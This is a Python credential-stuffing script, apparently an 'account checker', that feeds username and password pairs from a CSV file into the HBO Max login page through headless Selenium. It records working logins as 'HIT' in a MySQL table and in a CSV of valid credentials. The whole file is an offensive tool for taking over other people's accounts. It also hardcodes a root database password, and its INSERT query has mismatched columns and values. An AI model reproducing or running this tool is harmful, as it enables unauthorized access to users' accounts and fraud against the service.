import os.path
import csv
import locale
import time
import mysql.connector
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, WebDriverException
from tqdm import tqdm
from datetime import datetime
from colorama import Fore


def iniciar_sesion(usuario, contrasena, credenciales_validas):
    driver = None

    try:
        # Inicializar el navegador Chrome
        chrome_options = Options()
        chrome_options.add_argument('--headless')  # Habilita el modo headless
        chrome_options.add_argument("--disable-logging")  # Desactivar los logs de DevTools
        chrome_options.add_experimental_option("excludeSwitches", ["enable-logging"])
        driver = webdriver.Chrome(options=chrome_options)

        # Acceder a la página de inicio de sesión de HBO Max
        driver.get('https://play.hbomax.com/signIn')

        # Esperar hasta que aparezca el campo de usuario
        username_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, 'EmailTextInput'))
        )
        username_field.send_keys(usuario)

        # Esperar hasta que aparezca el campo de contraseña y hacer clic en 'Iniciar Sesión'
        password_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, 'PasswordTextInput'))
        )
        password_field.send_keys(contrasena)

        submit = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div[1]/div/div[3]/div[2]/div/div/div[1]/div/div[2]/div[2]/div/div/div/div[1]/div/div/div/div[2]/div[1]/div[4]/div[1]'))
        )
        submit.click()

        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.TAG_NAME, 'h1'))
        )

        # Esperar a que la URL cambie a la página de selección de perfil
        valid_url = 'https://play.hbomax.com/profile/select'
        # Verificar si hay un mensaje de error
        if valid_url in driver.current_url:
            print(
                f"[{Fore.GREEN}+{Fore.RESET}] {Fore.GREEN}HIT{Fore.RESET} | Las credenciales {Fore.GREEN}{usuario}:{contrasena}{Fore.RESET} funcionan correctamente"
            )
            credenciales_validas.append((usuario, contrasena))
            # Llamar a la función para guardar en la base de datos
            guardar_en_base_de_datos(usuario, contrasena)
    
        else:
            print(
                f"[{Fore.RED}!{Fore.RESET}] {Fore.RED}ERROR{Fore.RESET} | Las credenciales {Fore.RED}{usuario}:{contrasena}{Fore.RESET}  son inválidas"
            )
            eliminar_registro(usuario)

    except NoSuchElementException:
        print(
                f"[{Fore.RED}!{Fore.RESET}] {Fore.RED}ERROR{Fore.RESET} | Las credenciales {Fore.RED}{usuario}:{contrasena}{Fore.RESET}   no funcionan... Intentando con el siguiente conjunto"
            )
        eliminar_registro(usuario)
    except WebDriverException as e:
        print(
                f"[{Fore.RED}!{Fore.RESET}] {Fore.RED}ERROR{Fore.RESET} | Hubo un problema al intentar iniciar sesión con {Fore.RED}{usuario}:{contrasena}{Fore.RESET}"
            )
        eliminar_registro(usuario)
    except Exception as e:
        print(str(e))
    finally:
        if driver:
            driver.quit()

# Función para guardar en la base de datos
def guardar_en_base_de_datos(usuario, contrasena):
    try:
        # Configurar la conexión a la base de datos
        conexion = mysql.connector.connect(
            host="127.0.0.1",
            user="root",
            password="cazarezf97",
            database="accounts"
        )

        # Crear un cursor para ejecutar consultas SQL
        cursor = conexion.cursor()

        # Consulta SQL para verificar si ya existen las credenciales
        consulta_select = "SELECT * FROM hbomax WHERE username = %s AND password = %s"
        datos_select = (usuario, contrasena)

        # Ejecutar la consulta SELECT
        cursor.execute(consulta_select, datos_select)

        # Obtener los resultados
        resultados = cursor.fetchall()

        # Verificar si ya existen registros con las mismas credenciales
        if resultados:
            # Si existen, realizar una actualización con la fecha actual
            consulta_update = "UPDATE hbomax SET dateTested = %s WHERE username = %s AND password = %s"
            datos_update = (datetime.now(), usuario, contrasena)
            cursor.execute(consulta_update, datos_update)
            conexion.commit()
            print(f"[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] Registro de {Fore.LIGHTGREEN_EX}{usuario}:{contrasena}{Fore.RESET} actualizado con la fecha de prueba en la base de datos.")
       # ⚠
        else:
            # Si no existen, realizar la inserción
            consulta_insert = "INSERT INTO hbomax (idAccount, username, password, dateAdded, dateTested) VALUES (NULL, %s, %s, %s, %s, %s)"
            datos_insert = (usuario, contrasena, datetime.now(), datetime.now(), 1)

            # Ejecutar la consulta INSERT
            cursor.execute(consulta_insert, datos_insert)

            # Confirmar la transacción
            conexion.commit()

            print(f"[{Fore.GREEN}✓{Fore.RESET}] | Las credenciales {Fore.GREEN}{usuario}:{contrasena}{Fore.RESET} han sido guradadas en la base de datos")

    except mysql.connector.Error as error:
        print(f"[{Fore.RED}X{Fore.RESET}] Error al guardar en la base de datos: {error}")

    finally:
        # Cerrar el cursor y la conexión
        if 'cursor' in locals():
            cursor.close()
        if 'conexion' in locals():
            conexion.close()


# Función para eliminar registros en la base de datos
def eliminar_registro(usuario):
    try:
        conexion = mysql.connector.connect(
            host="127.0.0.1",
            user="root",
            password="cazarezf97",
            database="accounts"
        )
        cursor = conexion.cursor()

        consulta_delete = "DELETE FROM hbomax WHERE username = %s"
        datos_delete = (usuario,)

        cursor.execute(consulta_delete, datos_delete)
        conexion.commit()

        print(f"[{Fore.YELLOW}⚠{Fore.RESET}] Registro de {Fore.LIGHTRED_EX}{usuario}{Fore.RESET} eliminado de la base de datos.")

    except mysql.connector.Error as error:
        print(f"[{Fore.RED}X{Fore.RESET}] Error al eliminar registro de la base de datos: {error}")

    finally:
        if 'cursor' in locals():
            cursor.close()
        if 'conexion' in locals():
            conexion.close()



# Ruta al archivo CSV con las credenciales
csv_file_path = 'csv/data_hbomax.csv'
credenciales_validas = []

# Verificar si el archivo CSV existe
if os.path.isfile(csv_file_path):
    # Obtener el número total de líneas en el archivo CSV
    total_lines = sum(1 for line in open(csv_file_path))

    # Abrir el archivo CSV con tqdm
    with open(csv_file_path, 'r') as csv_file:
        csv_reader = csv.reader(csv_file)

        # Iterar sobre cada línea del archivo CSV con tqdm
        for line in tqdm(csv_reader, total=total_lines, desc="Procesando credenciales", unit=" línea"):
            usuario = line[0]
            contrasena = line[1]

            # Intentar iniciar sesión con las credenciales actuales
            iniciar_sesion(usuario, contrasena, credenciales_validas)

# Guardar las credenciales válidas en un archivo .csv
if credenciales_validas:
    locale.setlocale(locale.LC_TIME, 'es_ES.UTF-8')
    now = datetime.now()
    format_date = now.strftime('%d-%b-%Y_%I-%M-%S')  # Formato de fecha en el nombre del archivo

    # Cabeceras
    headers = ['Username', 'Password']

    # Guardar las credenciales válidas en un archivo .csv
    file_path = f'results/credenciales_validas_hbomax_{format_date}.csv'
    with open(file_path, 'w', newline='') as csv_file:
        # Escribir cabeceras y luego credenciales
        csv_writer = csv.writer(csv_file)
        csv_writer.writerow(headers)

        for credencial in credenciales_validas:
            csv_writer.writerow(credencial)

    print(f"[{Fore.GREEN}✓{Fore.RESET}] | Credenciales válidas guardadas en {file_path}")

else:
    print(f"[{Fore.RED}X{Fore.RESET}] | No hay credenciales válidas para guardar.")